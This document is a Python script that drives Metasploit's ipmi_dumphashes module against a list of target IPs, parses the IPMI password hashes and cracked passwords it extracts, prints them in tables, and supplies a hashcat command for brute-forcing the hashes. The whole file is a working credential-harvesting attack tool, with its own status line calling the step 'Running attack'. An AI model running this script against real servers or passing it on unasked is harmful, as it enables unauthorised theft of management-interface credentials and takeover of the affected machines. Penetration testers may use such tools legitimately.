#!/usr/bin/env python3

import subprocess
import sys
import re
from prettytable import PrettyTable
from termcolor import colored
import os

def print_status(message, color='yellow'):
    """Utility function to print colored status messages"""
    print(colored(message, color))

def run_msf_with_cmds(target_ips, threads=256):
    temp_file_path = "/tmp/msf_commands.rc"
    # Write the MSF commands to a temporary file in /tmp
    with open(temp_file_path, 'w') as f:
        f.write("use auxiliary/scanner/ipmi/ipmi_dumphashes\n")
        f.write(f"set RHOSTS {target_ips}\n")
        f.write(f"set THREADS {threads}\n")
        f.write("run\n")
        f.write("exit\n")

    print_status("Building the metasploit module...")
    try:
        result = subprocess.run(['msfconsole', '-q', '-r', temp_file_path], capture_output=True, text=True).stdout
    except Exception as e:
        print(colored(f"Error occurred while running metasploit: {str(e)}", 'red'))
        sys.exit(1)

    # Clean up temp file
    os.remove(temp_file_path)

    return result

def process_output(output):
    print_status("Running attack...")
    
    # Regex to extract required data
    hash_pattern = re.compile(r"Hash found: (\w+):([\w\d]+):([\w\d]+)")
    pass_pattern = re.compile(r"Hash for user '(\w+)' matches password '(\w+)'")

    hash_matches = hash_pattern.findall(output)
    pass_matches = pass_pattern.findall(output)

    if not hash_matches:
        print_status("No hashes were extracted.", 'red')
        sys.exit(1)

    password_dict = {k: v for k, v in pass_matches}

    table = PrettyTable()
    table.field_names = ["Username", "Hash", "Password"]

    for user, hash1, hash2 in hash_matches:
        password = password_dict.get(user, "Unknown")
        table.add_row([user, hash2, password])

    print_status("Hashes found... generating table.")
    print(table)

    # Space
    print("\n")

    # Display raw hashes
    raw_table = PrettyTable()
    raw_table.field_names = ["Raw Hashes"]
    for user, hash1, hash2 in hash_matches:
        raw_table.add_row([f"{user}:{hash1}:{hash2}"])
    
    hashcat_cmd = "hashcat -a 3 -m 7300 -i --increment-min=8 --increment-max=8 ipmi.txt -1 ?d?u ?1?1?1?1?1?1?1?1 --username"
    
    print_status(f"Below are the raw hashes found: {colored(hashcat_cmd, 'magenta')}", "cyan")
    print(raw_table)
    
    # Space
    print("\n")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: script.py <IP_or_filepath>")
        sys.exit(1)

    target = sys.argv[1]

    try:
        if '.txt' in target:
            with open(target, 'r') as f:
                ips = f.readlines()
            target_ips = " ".join([ip.strip() for ip in ips])
        else:
            target_ips = target
    except Exception as e:
        print(colored(f"Error occurred while reading target IPs: {str(e)}", 'red'))
        sys.exit(1)

    output = run_msf_with_cmds(target_ips)
    process_output(output)

